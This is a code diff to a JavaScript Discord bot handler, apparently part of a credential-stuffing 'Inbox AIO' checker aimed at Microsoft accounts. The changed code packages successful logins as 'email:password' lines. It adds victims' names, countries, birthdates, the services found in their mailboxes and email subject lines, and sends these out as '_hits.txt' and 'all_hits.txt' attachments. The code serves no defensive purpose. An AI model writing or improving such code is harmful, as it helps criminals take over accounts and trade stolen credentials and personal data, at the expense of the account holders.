@@ -1331,65 +1331,40 @@ async function handleInboxAio(respond, userId, accountsRaw, accountsFile, thread
       }
     }
 
-    // Build per-service file content
-    const serviceFiles = {}; // { serviceName: [ "email:pass | captures..." ] }
+    // Build per-service file content (new format: services = { Name: { count, subjects } })
+    const serviceFiles = {};
     for (const r of hitResults) {
       for (const [svcName, svcData] of Object.entries(r.services || {})) {
         if (!serviceFiles[svcName]) serviceFiles[svcName] = [];
         let line = `${r.user}:${r.password}`;
-        if (svcData.count) line += ` | Msgs: ${svcData.count}`;
-        if (svcData.date) line += ` | Last: ${svcData.date}`;
-        if (svcData.snippet) line += ` | ${svcData.snippet.slice(0, 80)}`;
+        if (r.name) line += ` | ${r.name}`;
+        if (r.country) line += ` | ${r.country}`;
+        if (svcData.count) line += ` | Found: ${svcData.count}`;
+        if (svcData.subjects && svcData.subjects.length > 0) {
+          line += ` | Subjects: ${svcData.subjects.slice(0, 5).join(", ")}`;
+        }
         serviceFiles[svcName].push(line);
       }
     }
 
-    // Build ZIP-like structure using multiple txt files grouped
-    // Discord doesn't support ZIP natively, so we send organized txt files
-    const { AttachmentBuilder } = require("discord.js");
-    const files = [];
-
-    // Summary file
-    const summaryLines = [
-      `Inbox AIO Results`,
-      `==================`,
-      `Total: ${results.length} | Hits: ${hitResults.length} | Failed: ${failResults.length}`,
-      `Locked: ${lockedResults.length} | 2FA: ${twoFAResults.length}`,
-      `Elapsed: ${Math.round(elapsed / 1000)}s`,
-      ``,
-      `Services Found:`,
-    ];
-    const sortedSvc = Object.entries(serviceBreakdown).sort((a, b) => b[1] - a[1]);
-    for (const [svc, count] of sortedSvc) {
-      summaryLines.push(`  ${svc}: ${count} accounts`);
-    }
-    files.push(textAttachment(summaryLines, "00_summary.txt"));
-
-    // Per-service files (grouped by category for organization)
-    const categoryGroups = {};
+    // Per-service files
     for (const [svcName, lines] of Object.entries(serviceFiles)) {
-      // Find category
-      const svcDef = require("./utils/microsoft-inbox").SERVICES.find(s => s.label === svcName);
-      const cat = svcDef?.category || "Other";
-      if (!categoryGroups[cat]) categoryGroups[cat] = {};
-      categoryGroups[cat][svcName] = lines;
-    }
-
-    for (const [cat, svcs] of Object.entries(categoryGroups)) {
-      for (const [svcName, lines] of Object.entries(svcs)) {
-        if (lines.length > 0) {
-          const safeName = svcName.replace(/[^a-zA-Z0-9]/g, "_").toLowerCase();
-          files.push(textAttachment(lines, `${cat}_${safeName}.txt`));
-        }
+      if (lines.length > 0) {
+        const safeName = svcName.replace(/[^a-zA-Z0-9]/g, "_").toLowerCase();
+        files.push(textAttachment(lines, `${safeName}_hits.txt`));
       }
     }
 
     // All hits combined
     if (hitResults.length > 0) {
       const allHitLines = hitResults.map(r => {
-        const svcs = Object.keys(r.services || {}).join(", ");
-        const caps = Object.entries(r.captures || {}).map(([k, v]) => `${k}: ${v}`).join(" | ");
-        return `${r.user}:${r.password}${svcs ? ` | Services: ${svcs}` : ""}${caps ? ` | ${caps}` : ""}`;
+        const svcs = Object.entries(r.services || {}).map(([n, d]) => `${n}(${d.count})`).join(", ");
+        let line = `${r.user}:${r.password}`;
+        if (r.name) line += ` | ${r.name}`;
+        if (r.country) line += ` | ${r.country}`;
+        if (r.birthdate && r.birthdate !== "--") line += ` | ${r.birthdate}`;
+        if (svcs) line += ` | ${svcs}`;
+        return line;
       });
       files.push(textAttachment(allHitLines, "all_hits.txt"));
     }
